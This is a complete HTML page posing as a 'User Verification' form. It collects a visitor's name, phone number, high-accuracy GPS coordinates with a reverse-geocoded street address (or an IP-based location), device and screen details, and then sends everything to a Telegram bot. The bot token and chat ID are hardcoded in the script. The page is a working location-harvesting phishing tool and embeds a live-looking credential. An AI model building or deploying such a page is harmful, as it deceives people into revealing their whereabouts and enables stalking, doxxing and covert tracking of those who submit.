<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>User Info Capture</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{
  font-family:Arial, sans-serif;
  background:#eef2f7;
  padding:20px;
}
.box{
  max-width:430px;
  margin:auto;
  background:#fff;
  padding:20px;
  border-radius:12px;
  box-shadow:0 4px 12px rgba(0,0,0,.1);
}
h2{text-align:center}
input,button{
  width:100%;
  padding:12px;
  margin:8px 0;
  border-radius:8px;
  border:1px solid #ccc;
  font-size:15px;
}
button{
  background:#0088cc;
  color:#fff;
  border:none;
  cursor:pointer;
}
#status{
  font-size:14px;
  text-align:center;
  margin-top:6px;
}
</style>
</head>

<body>
<div class="box">
<h2>User Verification</h2>

<input id="name" placeholder="Full Name" required>
<input id="phone" placeholder="Phone Number" required>

<button onclick="getGPS()">üìç Capture Location</button>
<div id="status"></div>

<button onclick="submitData()">Submit</button>
</div>

<script>
let gpsLat="", gpsLng="", accuracy="";
let fullAddress="Not Available";
let ipInfo="Not Available";

/* IP location backup */
async function getIPInfo(){
  try{
    let res = await fetch("https://ipapi.co/json/");
    let d = await res.json();
    ipInfo = `${d.city}, ${d.region}, ${d.country_name} | IP: ${d.ip}`;
  }catch{}
}
getIPInfo();

/* Reverse geocoding */
async function reverseGeocode(lat,lng){
  try{
    let res = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`
    );
    let data = await res.json();
    fullAddress = data.display_name || "Address not found";
  }catch{
    fullAddress = "Address fetch failed";
  }
}

/* Capture GPS */
function getGPS(){
  if(!navigator.geolocation){
    status.innerHTML="Geolocation not supported ‚ùå";
    return;
  }

  navigator.geolocation.getCurrentPosition(
    async pos=>{
      gpsLat = pos.coords.latitude;
      gpsLng = pos.coords.longitude;
      accuracy = pos.coords.accuracy;

      await reverseGeocode(gpsLat, gpsLng);

      status.innerHTML =
        "üìç Location & Address Captured ‚úîÔ∏è<br>"+
        "Accuracy: "+accuracy+" meters";
    },
    ()=>{
      status.innerHTML =
        "GPS denied ‚ùå<br>IP location will be used";
    },
    {
      enableHighAccuracy:true,
      timeout:10000,
      maximumAge:0
    }
  );
}

/* Submit to Telegram */
function submitData(){

  if(!name.value || !phone.value){
    alert("Fill all details");
    return;
  }

  // üî¥ PASTE YOUR TOKEN HERE
  let BOT_TOKEN = "7193425151:AAFKa2HcygWLjSOYWTcC917_joT6S-RBYyY";

  // ‚úÖ YOUR CHAT ID
  let CHAT_ID = "543961277";

  let time = new Date().toLocaleString("en-IN");
  let device = navigator.userAgent;
  let screenInfo = screen.width+"x"+screen.height;

  let locationBlock;

  if(gpsLat){
    let mapLink = `https://www.google.com/maps?q=${gpsLat},${gpsLng}`;
    locationBlock =
`üìç GPS Location
Lat: ${gpsLat}
Lng: ${gpsLng}
Accuracy: ${accuracy} m

üè† Address
${fullAddress}

üó∫ Map: ${mapLink}`;
  }else{
    locationBlock =
`üåê IP Based Location
${ipInfo}`;
  }

  let message =
`üì© NEW USER SUBMISSION

üë§ Name: ${name.value}
üìû Phone: ${phone.value}

${locationBlock}

üì± Device: ${device}
üñ• Screen: ${screenInfo}

‚è∞ Time: ${time}`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chat_id:CHAT_ID,
      text:message
    })
  })
  .then(()=>alert("Data sent to Telegram ‚úÖ"))
  .catch(()=>alert("Telegram error ‚ùå"));
}
</script>
</body>
</html>
